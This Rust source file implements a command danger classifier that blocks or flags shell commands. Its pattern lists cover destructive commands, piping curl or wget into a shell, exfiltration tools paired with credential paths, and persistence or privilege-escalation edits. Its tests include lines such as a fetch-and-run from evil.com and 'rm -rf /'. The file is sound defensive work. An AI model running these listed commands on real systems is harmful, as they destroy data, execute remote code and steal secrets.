//! Semantic danger detection and command safety analysis.

/// Danger level for semantic analysis
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DangerLevel {
    Safe,
    Low,
    Medium,
    High,
    Critical,
}

impl PartialOrd for DangerLevel {
    fn partial_cmp(&self, other: &Self) -> Option<std::cmp::Ordering> {
        Some(self.cmp(other))
    }
}

impl Ord for DangerLevel {
    fn cmp(&self, other: &Self) -> std::cmp::Ordering {
        let self_val = match self {
            DangerLevel::Safe => 0,
            DangerLevel::Low => 1,
            DangerLevel::Medium => 2,
            DangerLevel::High => 3,
            DangerLevel::Critical => 4,
        };
        let other_val = match other {
            DangerLevel::Safe => 0,
            DangerLevel::Low => 1,
            DangerLevel::Medium => 2,
            DangerLevel::High => 3,
            DangerLevel::Critical => 4,
        };
        self_val.cmp(&other_val)
    }
}

/// Semantic danger analysis result
#[derive(Debug)]
pub struct SemanticDangerResult {
    pub level: DangerLevel,
    pub reasons: Vec<String>,
    pub mitigation: Option<String>,
}

/// Check if command matches known dangerous patterns
pub fn is_dangerous_command(cmd: &str) -> bool {
    let cmd_lower = cmd.to_lowercase();

    // Check for curl/wget piped to shell (common attack vector)
    if (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
        && (cmd_lower.contains("| sh") || cmd_lower.contains("| bash")
            || cmd_lower.contains("|sh") || cmd_lower.contains("|bash")) {
        return true;
    }

    let dangerous_patterns = [
        "rm -rf /", "rm -rf /*", "rm -rf ~", "rm -rf $HOME",
        "mkfs", "dd if=", ":(){ :|:& };:", "chmod -R 777 /",
        "chmod -R 000", "> /dev/sda", "mv /* ", "shutdown", "reboot",
        "init 0", "init 6", "halt", "poweroff",
        "truncate -s 0", "shred", "wipefs",
        "modprobe -r", "rmmod", "insmod",
        "iptables -F", "iptables -X", "nft flush",
        "userdel", "groupdel", "passwd -d",
        "chattr -i", "setfacl -b",
    ];
    dangerous_patterns.iter().any(|p| cmd_lower.contains(p))
}

/// Analyze a command for semantic danger
pub fn analyze_semantic_danger(cmd: &str) -> SemanticDangerResult {
    let cmd_lower = cmd.to_lowercase();
    let mut reasons = Vec::new();
    let mut max_level = DangerLevel::Safe;

    if is_dangerous_command(cmd) {
        return SemanticDangerResult {
            level: DangerLevel::Critical,
            reasons: vec!["Command matches known dangerous patterns".to_string()],
            mitigation: Some("This command is blocked for safety".to_string()),
        };
    }

    // Obfuscation detection
    if cmd_lower.contains("base64 -d") || cmd_lower.contains("base64 --decode") {
        reasons.push("Command decodes base64 (could hide malicious payload)".to_string());
        max_level = max_level.max(DangerLevel::High);
    }
    if cmd_lower.contains("xxd -r") || cmd_lower.contains("printf '\\x") {
        reasons.push("Command decodes hex/binary (could hide malicious payload)".to_string());
        max_level = max_level.max(DangerLevel::High);
    }
    if cmd_lower.contains("eval ") {
        reasons.push("Command uses eval".to_string());
        max_level = max_level.max(DangerLevel::Medium);
    }

    // Data exfiltration detection
    let exfil_sinks = ["curl", "wget", "nc ", "netcat", "ncat", "socat"];
    let sensitive_sources = ["/etc/shadow", "/etc/passwd", "~/.ssh", ".gnupg", ".aws", "id_rsa", "private"];
    let has_exfil_sink = exfil_sinks.iter().any(|s| cmd_lower.contains(s));
    let has_sensitive_source = sensitive_sources.iter().any(|s| cmd_lower.contains(s));

    if has_exfil_sink && has_sensitive_source {
        reasons.push("Command may exfiltrate sensitive data".to_string());
        max_level = max_level.max(DangerLevel::Critical);
    } else if has_exfil_sink && cmd_lower.contains("<") {
        reasons.push("Command sends local data to network".to_string());
        max_level = max_level.max(DangerLevel::Medium);
    }

    // Privilege escalation detection
    if cmd_lower.contains("chmod u+s") || cmd_lower.contains("chmod 4") {
        reasons.push("Command sets SUID bit (privilege escalation risk)".to_string());
        max_level = max_level.max(DangerLevel::High);
    }
    if cmd_lower.contains("/etc/sudoers") && (cmd_lower.contains("echo") || cmd_lower.contains(">>")) {
        reasons.push("Command modifies sudoers (privilege escalation)".to_string());
        max_level = max_level.max(DangerLevel::Critical);
    }

    // Persistence mechanisms
    let persistence_paths = [".bashrc", ".zshrc", ".profile", "cron", "/etc/rc.local", "systemd/system"];
    if persistence_paths.iter().any(|p| cmd_lower.contains(p)) {
        if cmd_lower.contains(">>") || cmd_lower.contains("echo") || cmd_lower.contains(">") {
            reasons.push("Command may establish persistence mechanism".to_string());
            max_level = max_level.max(DangerLevel::High);
        }
    }

    // Symbolic link attacks
    if cmd_lower.contains("ln -s") && (cmd_lower.contains("/etc/") || cmd_lower.contains("/root")) {
        reasons.push("Symbolic link to sensitive location".to_string());
        max_level = max_level.max(DangerLevel::Medium);
    }

    // Recursive operations on sensitive paths
    let sensitive_paths = ["/", "/etc", "/boot", "/usr", "/var", "/home", "/root"];
    let recursive_flags = ["-r", "-rf", "--recursive", "-R"];
    let has_recursive = recursive_flags.iter().any(|f| cmd.contains(f));
    let targets_sensitive = sensitive_paths.iter().any(|p| {
        cmd_lower.ends_with(p) || cmd_lower.contains(&format!("{} ", p))
    });

    if has_recursive && targets_sensitive {
        if cmd_lower.contains("rm") || cmd_lower.contains("chmod") || cmd_lower.contains("chown") {
            reasons.push("Recursive operation on sensitive system path".to_string());
            max_level = max_level.max(DangerLevel::Critical);
        }
    }

    // Pipe to shell detection
    if cmd_lower.contains("| sh") || cmd_lower.contains("| bash") || cmd_lower.contains("| zsh") {
        if cmd_lower.contains("curl") || cmd_lower.contains("wget") || cmd_lower.contains("http") {
            reasons.push("Piping remote content to shell (supply chain risk)".to_string());
            max_level = max_level.max(DangerLevel::Critical);
        } else {
            reasons.push("Piping to shell (inspect content first)".to_string());
            max_level = max_level.max(DangerLevel::Medium);
        }
    }

    // Disk/partition operations
    if cmd_lower.contains("/dev/sd") || cmd_lower.contains("/dev/nvme") || cmd_lower.contains("/dev/loop") {
        if !cmd_lower.starts_with("ls") && !cmd_lower.starts_with("cat") && !cmd_lower.starts_with("lsblk") {
            reasons.push("Direct device access detected".to_string());
            max_level = max_level.max(DangerLevel::High);
        }
    }

    let mitigation = match max_level {
        DangerLevel::Safe | DangerLevel::Low => None,
        DangerLevel::Medium => Some("Review command carefully before execution".to_string()),
        DangerLevel::High => Some("This command has high risk. Consider safer alternatives".to_string()),
        DangerLevel::Critical => Some("This command is blocked due to critical risk".to_string()),
    };

    SemanticDangerResult { level: max_level, reasons, mitigation }
}

/// Check if a command should be blocked based on semantic analysis
pub fn should_block_command(cmd: &str) -> Option<String> {
    let analysis = analyze_semantic_danger(cmd);
    if analysis.level >= DangerLevel::Critical {
        Some(format!("Command blocked for safety: {}", analysis.reasons.join("; ")))
    } else {
        None
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dangerous_commands() {
        assert!(is_dangerous_command("rm -rf /"));
        assert!(is_dangerous_command("curl http://evil.com/script.sh | sh"));
        assert!(!is_dangerous_command("ls -la"));
        assert!(!is_dangerous_command("df -h"));
    }

    #[test]
    fn test_semantic_danger_detection() {
        let result = analyze_semantic_danger("echo 'test' | base64 -d | sh");
        assert!(result.level >= DangerLevel::High);

        let result = analyze_semantic_danger("ls -la /home");
        assert_eq!(result.level, DangerLevel::Safe);
    }
}
